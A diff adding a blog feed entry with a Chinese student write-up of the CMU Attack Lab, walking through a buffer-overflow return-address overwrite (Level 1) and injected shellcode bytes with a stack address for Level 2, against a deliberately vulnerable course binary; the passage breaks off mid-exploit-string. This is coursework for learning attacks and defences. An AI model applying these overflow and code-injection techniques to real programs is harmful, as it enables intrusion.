@@ -8,8 +8,448 @@
     <author>
       <name>AquaOH</name>
     </author>
-    <updated>2023-11-17T21:08:32.860Z</updated>
+    <updated>2023-11-19T14:26:15.955Z</updated>
     <category term="Betrayer" />
+    <entry>
+        <id>https://aquaoh.cc/2023/11/19/aboutme/</id>
+        <title></title>
+        <link rel="alternate" href="https://aquaoh.cc/2023/11/19/aboutme/"/>
+        <content type="html">&lt;h1 id=&#34;attack-lab&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#attack-lab&#34;&gt;#&lt;/a&gt; Attack Lab&lt;/h1&gt;
+&lt;p&gt;10225501432 邓博昊 target66&lt;/p&gt;
+&lt;h2 id=&#34;ctarget&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ctarget&#34;&gt;#&lt;/a&gt; ctarget&lt;/h2&gt;
+&lt;p&gt;使用 &lt;code&gt;gdb ctarget&lt;/code&gt;  调试程序&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;disass &amp;lt;function&amp;gt;&lt;/code&gt;  获得 &lt;code&gt;&amp;lt;function&amp;gt;&lt;/code&gt;  的汇编代码&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;r -i &amp;#123;phase_i_raw&amp;#125;&lt;/code&gt;  带入 &lt;code&gt;exploit string&lt;/code&gt;  运行程序&lt;/p&gt;
+&lt;h3 id=&#34;level-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-1&#34;&gt;#&lt;/a&gt; Level 1&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;ctarget&lt;/code&gt;  程序被调用时，执行 &lt;code&gt;test&lt;/code&gt;  函数， &lt;code&gt;test&lt;/code&gt;  函数调用 &lt;code&gt;getbuf&lt;/code&gt;  函数&lt;/p&gt;
+&lt;p&gt;我们需要将 &lt;code&gt;getbuf&lt;/code&gt;  函数在返回时重定向到 &lt;code&gt;touch1&lt;/code&gt;  而非继续回到 &lt;code&gt;test&lt;/code&gt;  函数&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;1) 查看 &lt;code&gt;test&lt;/code&gt; 、 &lt;code&gt;touch1&lt;/code&gt;  函数 C 代码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;先贴出题干所给函数代码&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    val &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getbuf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;No exploit. Getbuf returned 0x%x\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;touch1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    vlevel &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Touch!: You called touch1()\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;2) 查看 &lt;code&gt;getbuf&lt;/code&gt; 、 &lt;code&gt;touch1&lt;/code&gt;  函数汇编代码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;获取 &lt;code&gt;getbuf&lt;/code&gt; 、 &lt;code&gt;touch1&lt;/code&gt;  函数汇编代码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Dump of assembler code for function getbuf:
+   0x0000555555401a65 &amp;lt;+0&amp;gt;:	sub    $0x18,%rsp
+   0x0000555555401a69 &amp;lt;+4&amp;gt;:	mov    %rsp,%rdi
+   0x0000555555401a6c &amp;lt;+7&amp;gt;:	call   0x555555401d05 &amp;lt;Gets&amp;gt;
+   0x0000555555401a71 &amp;lt;+12&amp;gt;:	mov    $0x1,%eax
+   0x0000555555401a76 &amp;lt;+17&amp;gt;:	add    $0x18,%rsp
+   0x0000555555401a7a &amp;lt;+21&amp;gt;:	ret    
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Dump of assembler code for function touch1:
+   0x0000555555401a7b &amp;lt;+0&amp;gt;:	sub    $0x8,%rsp
+   0x0000555555401a7f &amp;lt;+4&amp;gt;:	movl   $0x1,0x203953(%rip)        # 0x5555556053dc &amp;lt;vlevel&amp;gt;
+   0x0000555555401a89 &amp;lt;+14&amp;gt;:	lea    0x1967(%rip),%rdi        # 0x5555554033f7
+   0x0000555555401a90 &amp;lt;+21&amp;gt;:	call   0x555555400e10 &amp;lt;puts@plt&amp;gt;
+   0x0000555555401a95 &amp;lt;+26&amp;gt;:	mov    $0x1,%edi
+   0x0000555555401a9a &amp;lt;+31&amp;gt;:	call   0x555555401f75 &amp;lt;validate&amp;gt;
+   0x0000555555401a9f &amp;lt;+36&amp;gt;:	mov    $0x0,%edi
+   0x0000555555401aa4 &amp;lt;+41&amp;gt;:	call   0x555555400f80 &amp;lt;exit@plt&amp;gt;
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;getbuf&lt;/code&gt;  函数开辟了 24 个字节的栈空间&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;3) 构建攻击字符串&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;我们目前可以知道的:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;运行环境为 &lt;code&gt;AMD64 Linux&lt;/code&gt; , 使用小端法，内存低位储存低位字节数&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;栈的生长方向向内存低位生长&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;getbuf&lt;/code&gt;  函数 ret 地址为 % rsp+0x18&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;touch1&lt;/code&gt;  函数入口为 &lt;code&gt;0x0000555555401a7b&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;我们需要构建一个字符串，其需要满足的条件:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;改变 &lt;code&gt;getbuf&lt;/code&gt;  函数 ret 时返回地址，使其变为 &lt;code&gt;0x0000555555401a7b&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;数字需要的字节数为 &lt;code&gt;24+8 = 32&lt;/code&gt;  位&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;符合小端法&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;字符串数据按输入顺序从低地址向高地址存储数据&lt;/p&gt;
+&lt;p&gt;无意义的字符均用 0 表示，我们需要构建的字符串即为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+7b 1a 40 55 55 55 00 00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将上述字符串存入 &lt;code&gt;phase_1.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;4) 将字符串转化为字节码并运行程序&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;输入以下命令即可完成 &lt;code&gt;touch1&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./hex2raw &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; phase_1.txt &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; phase_1_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb ctarget&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; phase_1_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;level-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-2&#34;&gt;#&lt;/a&gt; Level 2&lt;/h3&gt;
+&lt;p&gt;任务要求 &lt;code&gt;ctarget&lt;/code&gt;  程序执行 &lt;code&gt;touch2&lt;/code&gt;  函数，而非返回 &lt;code&gt;test&lt;/code&gt;  函数&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;1) 查看 &lt;code&gt;touch2&lt;/code&gt;  函数 C 代码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;题干所给 &lt;code&gt;touch2&lt;/code&gt;  函数 C 代码如下&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;touch2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    vlevel &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;/* Part of validation protocol */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;val &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; cookie&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Touch2!: You called touch2(0x%.8x)\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Misfire: You called touch2(0x%.8x)\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fail&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;touch2&lt;/code&gt;  函数要求传入一个参数 &lt;code&gt;val&lt;/code&gt; , 只有 &lt;code&gt;val&lt;/code&gt;  和 &lt;code&gt;cookie&lt;/code&gt;  值相同程序才执行成功&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;2) 查看 &lt;code&gt;touch2&lt;/code&gt;  函数汇编代码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;touch&lt;/code&gt;  函数汇编代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Dump of assembler code for function touch2:
+   0x0000555555401aa9 &amp;lt;+0&amp;gt;:	sub    $0x8,%rsp
+   0x0000555555401aad &amp;lt;+4&amp;gt;:	mov    %edi,%edx
+   0x0000555555401aaf &amp;lt;+6&amp;gt;:	movl   $0x2,0x203923(%rip)        # 0x5555556053dc &amp;lt;vlevel&amp;gt;
+   0x0000555555401ab9 &amp;lt;+16&amp;gt;:	cmp    %edi,0x203925(%rip)        # 0x5555556053e4 &amp;lt;cookie&amp;gt;
+   0x0000555555401abf &amp;lt;+22&amp;gt;:	je     0x555555401aeb &amp;lt;touch2+66&amp;gt;
+   0x0000555555401ac1 &amp;lt;+24&amp;gt;:	lea    0x1980(%rip),%rsi        # 0x555555403448
+   0x0000555555401ac8 &amp;lt;+31&amp;gt;:	mov    $0x1,%edi
+   0x0000555555401acd &amp;lt;+36&amp;gt;:	mov    $0x0,%eax
+   0x0000555555401ad2 &amp;lt;+41&amp;gt;:	call   0x555555400f30 &amp;lt;__printf_chk@plt&amp;gt;
+   0x0000555555401ad7 &amp;lt;+46&amp;gt;:	mov    $0x2,%edi
+   0x0000555555401adc &amp;lt;+51&amp;gt;:	call   0x555555402045 &amp;lt;fail&amp;gt;
+   0x0000555555401ae1 &amp;lt;+56&amp;gt;:	mov    $0x0,%edi
+   0x0000555555401ae6 &amp;lt;+61&amp;gt;:	call   0x555555400f80 &amp;lt;exit@plt&amp;gt;
+   0x0000555555401aeb &amp;lt;+66&amp;gt;:	lea    0x192e(%rip),%rsi        # 0x555555403420
+   0x0000555555401af2 &amp;lt;+73&amp;gt;:	mov    $0x1,%edi
+   0x0000555555401af7 &amp;lt;+78&amp;gt;:	mov    $0x0,%eax
+   0x0000555555401afc &amp;lt;+83&amp;gt;:	call   0x555555400f30 &amp;lt;__printf_chk@plt&amp;gt;
+   0x0000555555401b01 &amp;lt;+88&amp;gt;:	mov    $0x2,%edi
+   0x0000555555401b06 &amp;lt;+93&amp;gt;:	call   0x555555401f75 &amp;lt;validate&amp;gt;
+   0x0000555555401b0b &amp;lt;+98&amp;gt;:	jmp    0x555555401ae1 &amp;lt;touch2+56&amp;gt;
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;则 &lt;code&gt;touch2&lt;/code&gt;  函数入口地址为 &lt;code&gt;0x0000555555401aa9&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;3) 构建汇编代码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;实验给出的建议:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 ret 指令调用 touch2 函数&lt;/li&gt;
+&lt;li&gt;touch2 的参数要存在 rdi 寄存器中&lt;/li&gt;
+&lt;li&gt;插入的代码应该设置寄存器存着 Cookie，然后再返回 touch2&lt;/li&gt;
+&lt;li&gt;不用 jmp 和 call 指令&lt;/li&gt;
+&lt;li&gt;使用 gcc 和 objdump 生成要插入代码的字节码格式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;我的 &lt;code&gt;cookie = 0x3e8dee8f&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;则我们需要构建的汇编代码应该为&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;movq $0x3e8dee8f,%rdi
+movq $0x0000555555401aa9,%rsi  # 存储touch2入口地址
+push %rsi
+ret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将上述代码存储在 &lt;code&gt;phase_2_assembly.s&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;4) 获得机械码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;使用如下命令生成并反编译获得机械码&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gcc &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; phase_2_assembly.s &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; phase_2_assembly.o&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;objdump &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt; phase_2_assembly.o &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; phase_2_assembly.d&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;打开 &lt;code&gt;phase_2_assembly.d&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Disassembly of section .text:
+
+0000000000000000 &amp;lt;.text&amp;gt;:
+   0:	48 c7 c7 8f ee 8d 3e 	mov    $0x3e8dee8f,%rdi
+   7:	48 be a9 1a 40 55 55 	movabs $0x555555401aa9,%rsi
+   e:	55 00 00 
+  11:	56                   	push   %rsi
+  12:	c3                   	ret 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;则这段程序机械码为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;48 c7 c7 8f ee 8d 3e 48 be a9 1a 40 55 55 55 00 00 56 c3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;5) 构建攻击字符串&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;思路为:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;getbuff&lt;/code&gt;  函数获取攻击字符串&lt;/li&gt;
+&lt;li&gt;字符串使得 &lt;code&gt;getbuff&lt;/code&gt;  函数返回至 &lt;code&gt;buff&lt;/code&gt;  数组起点&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;buff&lt;/code&gt;  数组起点按顺序储存机械码&lt;/li&gt;
+&lt;li&gt;程序按照储存的机械码执行我们设计好的汇编指令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此我们需要查看 &lt;code&gt;buff&lt;/code&gt;  数组起点的内存地址，即 &lt;code&gt;%rsp&lt;/code&gt;  储存的内容&lt;/p&gt;
+&lt;p&gt;由 Level 1 中 &lt;code&gt;getbuf&lt;/code&gt;  函数汇编代码可知， &lt;code&gt;getbuf&lt;/code&gt;  函数入口为 &lt;code&gt;0x0000555555401a65&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用如下命令:&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb ctarget&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;b *0x0000555555401a65&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r &lt;span class=&#34;token parameter variable&#34;&gt;-qi&lt;/span&gt; phase_1_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;stepi&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;rsp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输出:&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;void *&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 0x55621b58&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;故构建如下字符串&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;48 c7 c7 8f ee 8d 3e 48
+be a9 1a 40 55 55 55 00
